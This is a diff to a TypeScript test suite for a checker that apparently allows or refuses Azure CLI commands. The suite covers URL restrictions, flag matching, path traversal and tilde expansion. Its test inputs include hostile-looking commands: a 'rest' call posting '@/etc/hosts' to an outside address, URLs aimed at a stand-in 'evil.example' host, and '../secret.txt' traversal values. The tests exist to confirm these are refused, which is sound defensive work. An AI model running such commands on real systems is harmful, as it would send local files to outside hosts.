@@ -58,6 +58,11 @@ describe("evaluateAzCommand", () => {
     expect(refusal(command).title).toContain(title);
   });
 
+  test("refuses --version, which asks PyPI for updates, and allows the offline version", () => {
+    expect(refusal("--version").message).toContain("use `version`");
+    expect(allowed("version").argv).toEqual(["version"]);
+  });
+
   test.each([
     "login",
     "logout",
@@ -69,8 +74,11 @@ describe("evaluateAzCommand", () => {
     "bicep install",
     "aks install-cli",
     "storage copy -s a -d b",
+    "storage fs directory upload -f fs -s ./dir --account-name a",
+    "storage fs directory download -f fs -s dir -d ./out --account-name a",
     "find vm",
     "webapp ssh -n app -g rg",
+    "ssh vm -n vm1 -g rg",
   ])("denies %j", (command) => {
     expect(refusal(command).message).toMatch(/is not allowed here: /);
   });
@@ -81,17 +89,21 @@ describe("evaluateAzCommand", () => {
     expect(allowed("extension list").argv).toEqual(["extension", "list"]);
   });
 
-  test("denied flags, also as argparse abbreviations", () => {
+  test("denied flags, matched exactly", () => {
     expect(refusal("container logs -n c -g rg --follow").title).toBe("Flag not allowed");
-    expect(refusal("container logs -n c -g rg --foll").title).toBe("Flag not allowed");
     expect(refusal("webapp up -n app -b").message).toContain(
       "`az webapp up` cannot be run with `-b`"
     );
     expect(allowed("group list -b x").argv).toContain("-b"); // -b is denied only on webapp up
+    // az reads these as --location and --force-deletion, not as the denied flags they start.
+    expect(allowed("group create -n rg --lo westeurope").argv).toContain("--lo");
+    expect(allowed("vm delete -n vm1 -g rg --fo --yes").argv).toContain("--fo");
   });
 
   test.each([
     "storage blob upload -f ../secret.txt -c c -n n",
+    "storage blob upload -f../secret.txt -c c -n n",
+    "storage blob upload -f..\\secret.txt -c c -n n",
     "deployment group create -g rg --template-file=..\\up\\main.json",
     "group create -n x --tags @../tags.json",
     "rest --url /a/../b",
@@ -112,10 +124,51 @@ describe("evaluateAzCommand", () => {
     expect(allowed("rest -u https://management.azure.com").argv[2]).toBe("/");
   });
 
-  test("leaves other URLs, and management URLs outside rest, as they are", () => {
-    const local = allowed("rest --url https://azure.localhost.localstack.cloud:4566/x");
-    expect(local.argv[2]).toBe("https://azure.localhost.localstack.cloud:4566/x");
-    expect(allowed("rest --url https://management.azure.com.evil.example/x").notes).toEqual([]);
+  test("rest calls local hosts only: a file given as the body would go wherever the URL points", () => {
+    for (const command of [
+      "rest --method post --url http://10.1.2.3:8080/x --body @/etc/hosts",
+      "rest --uri=HTTP://evil.example/x",
+      "rest -uhttps://evil.example/x",
+      "rest --ur https://evil.example/x", // argparse reads --ur as --url
+      "rest --url http:evil.example/x",
+      "rest --url https://management.azure.com.evil.example/x",
+      "rest --url https://localhost@evil.example/x",
+    ]) {
+      expect(refusal(command).title).toBe("URL not allowed");
+    }
+    for (const url of [
+      "https://azure.localhost.localstack.cloud:4566/x",
+      "http://localhost:4566/_localstack/health",
+      "http://127.0.0.1:4566/x",
+      "/subscriptions?api-version=2022-12-01",
+      "//evil.example/x", // no scheme: az puts the emulator's endpoint before it
+    ]) {
+      expect(allowed(`rest --url ${url}`).argv[2]).toBe(url);
+    }
     expect(allowed("group list --query https://management.azure.com/x").notes).toEqual([]);
+  });
+
+  test("a leading ~ is the user's home, not the tool's private one", () => {
+    const linux = { home: "/home/u", platform: "linux" as NodeJS.Platform };
+    const argv = (command: string, user = linux) => {
+      const result = evaluateAzCommand(command, user);
+      if (!result.ok) throw new Error(result.message);
+      return result.argv;
+    };
+    expect(argv("deployment group create -g rg --template-file ~/infra/main.json")[6]).toBe(
+      "/home/u/infra/main.json"
+    );
+    expect(argv("rest --url /x --body @~/b.json")[4]).toBe("@/home/u/b.json");
+    expect(argv("bicep build --file=~/main.bicep")[2]).toBe("--file=/home/u/main.bicep");
+    expect(argv("group list --query ~x --tags a=~/b")).toEqual([
+      "group",
+      "list",
+      "--query",
+      "~x",
+      "--tags",
+      "a=~/b",
+    ]);
+    const windows = { home: "C:\\Users\\u", platform: "win32" as const };
+    expect(argv("storage blob upload -f ~\\a.txt", windows)[4]).toBe("C:\\Users\\u\\a.txt");
   });
 });
